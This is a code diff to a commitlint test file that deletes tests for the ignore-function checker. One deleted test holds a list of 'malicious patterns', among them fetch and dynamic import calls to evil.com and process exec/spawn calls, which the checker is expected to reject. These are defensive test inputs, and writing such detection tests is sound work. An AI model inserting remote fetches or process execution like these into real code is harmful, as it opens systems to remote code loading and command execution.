@@ -1,7 +1,6 @@
 import {test, expect} from 'vitest';
 
 import isIgnored from './is-ignored.js';
-import {Matcher} from '@commitlint/types';
 
 const VERSION_MESSAGES = [
 	'0.0.1',
@@ -205,65 +204,4 @@ test('should throw error if any element of ignores is not a function', () => {
 			ignores: ['throws error'],
 		} as any);
 	}).toThrow('ignores must be array of type function, received items of type:');
-});
-
-test('should throw error if custom ignore function returns non-boolean value', () => {
-	const testCases = [
-		() => 1, // number
-		() => 'true', // string
-		() => undefined, // undefined
-		() => null, // null
-		() => ({}), // object
-		() => [], // array
-	];
-
-	testCases.forEach((testFn) => {
-		expect(() => {
-			isIgnored('some commit', {
-				ignores: [testFn as unknown as Matcher],
-			});
-		}).toThrow('Ignore function must return a boolean');
-	});
-});
-
-test('should throw error for custom ignore functions with security risks', () => {
-	const maliciousPatterns = [
-		'function() { fetch("https://evil.com"); return true; }',
-		'function() { import("https://evil.com"); return true; }',
-		'function() { require("fs"); return true; }',
-		'function() { process.exec("ls"); return true; }',
-		'function() { process.spawn("ls"); return true; }',
-		'function() { process.execFile("ls"); return true; }',
-		'function() { process.execSync("ls"); return true; }',
-		'function() { new XMLHttpRequest(); return true; }',
-	];
-
-	maliciousPatterns.forEach((fnString) => {
-		const fn = new Function(`return ${fnString}`)();
-		expect(() => {
-			isIgnored('some commit', {
-				ignores: [fn],
-			});
-		}).toThrow('Ignore function contains forbidden pattern');
-	});
-});
-
-test('should not throw error for custom ignore functions without security risks', () => {
-	const safePatterns = [
-		'function(commit) { return commit === "some commit"; }',
-		'function(commit) { return commit.startsWith("some"); }',
-		'function(commit) { return commit.includes("some"); }',
-		'function(commit) { return commit.length < 10 && commit.includes("some"); }',
-		'function(commit) { return commit.length < 10 || commit.includes("fetch"); }',
-		'function(commit) { return commit.includes("exec"); }',
-	];
-
-	safePatterns.forEach((fnString) => {
-		const fn = new Function(`return ${fnString}`)();
-		expect(() => {
-			isIgnored('some commit', {
-				ignores: [fn],
-			});
-		}).not.toThrow();
-	});
 });
